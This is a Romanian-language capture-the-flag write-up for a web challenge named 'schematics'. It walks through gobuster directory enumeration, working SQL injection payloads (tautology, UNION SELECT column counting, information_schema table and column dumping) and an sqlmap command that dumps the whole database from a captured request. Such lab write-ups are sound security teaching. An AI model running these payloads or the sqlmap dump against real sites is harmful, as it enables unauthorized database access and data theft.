# Write-up: schematics 

<img width="780" height="233" alt="image" src="https://github.com/user-attachments/assets/5fc522d5-e521-4357-83c3-8c727d48e78e" />


![Author](https://img.shields.io/badge/Author-ZNQ-red?style=for-the-badge)

![Category](https://img.shields.io/badge/Category-Web%20Exploitation-orange?style=for-the-badge&logo=kalilinux)

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-yellow?style=for-the-badge)

![Points](https://img.shields.io/badge/Points-500-success?style=for-the-badge)

![Status](https://img.shields.io/badge/Status-SOLVED-brightgreen?style=for-the-badge)          

## Rezolvare :

<img width="456" height="182" alt="image" src="https://github.com/user-attachments/assets/bb1b6598-f5fe-4aba-ae40-c3653939a76f" />

### Initial am inceput cu o enumerare de directoare cu extensia de php utilizand Gobuster :


<img width="700" height="212" alt="image" src="https://github.com/user-attachments/assets/d185badd-1162-42aa-b5ab-434f257937f7" />


```py
gobuster dir -u http://34.159.223.98:30758 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php
```

<img width="510" height="110" alt="image" src="https://github.com/user-attachments/assets/916280bf-0107-46fc-ac20-94d3717c577f" />


## Am creat un cont si m-am conectat pe pagina 


<img width="327" height="258" alt="image" src="https://github.com/user-attachments/assets/0b4e8a0e-6014-4857-8dd8-27bd74fbe3ac" />

## Am testat Sql Injection si a functionat afisandu-ne produse :

```sql
test' or '1' = '1' -- -
```

<img width="324" height="384" alt="image" src="https://github.com/user-attachments/assets/94056156-c64a-46c1-be95-af31a3ffce1f" />

## Am enumerat baza de date si am aflat ca aceasta contine 4 coloane deoarece daca punem 1, 2, 3, 4, 5 nu afiseaza nimic 

```sql
test' union select 1, 2, 3, 4 -- -
```

<img width="347" height="330" alt="image" src="https://github.com/user-attachments/assets/cd8bc13f-3050-482d-b02c-2ceafc8edad6" />

## Dupa ce am aflat ca putem afisa date pe coloana 2 am folosit :


```sql
test' union select 1, group_concat(table_name), 3, 4 from information_schema.tables where table_schema=database() -- -
```

<img width="515" height="352" alt="image" src="https://github.com/user-attachments/assets/a0362bd2-430a-4a5b-b274-f65256220d08" />


## Outputu-l ne confirma cele 3 tabele si jumatate din flag:

```
CTF{1nformat1on_sch3ma_c4n_ , products , users
```

## Si am cautat tot steagul:

```sql
test' union select 1, group_concat(column_name), 3, 4 from information_schema.columns where table_name='CTF{1nformat1on_sch3ma_c4n_' -- -
```


<img width="339" height="353" alt="image" src="https://github.com/user-attachments/assets/658f3eb1-2036-4999-a9a2-3b2e7b8fecdd" />


# Alternativa SQL-Map

```py
# Creare fisier -> aici.txt

POST /index.php HTTP/1.1
Host: 34.159.223.98:30758
Content-Length: 28
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://34.159.223.98:30758
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.159.223.98:30758/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=d6612d886b762659597b7dd38cfe43f8
Connection: keep-alive

product_name=a&submit=Search

```

## O alta alternativa ar fi folositea sql-map pentru a da dump la db.

```sql
sqlmap --level 3 --risk 3 -r aici.txt --batch --dump
```

<img width="937" height="773" alt="image" src="https://github.com/user-attachments/assets/d0e69281-0774-4c96-a95b-5ee6d27119e5" />







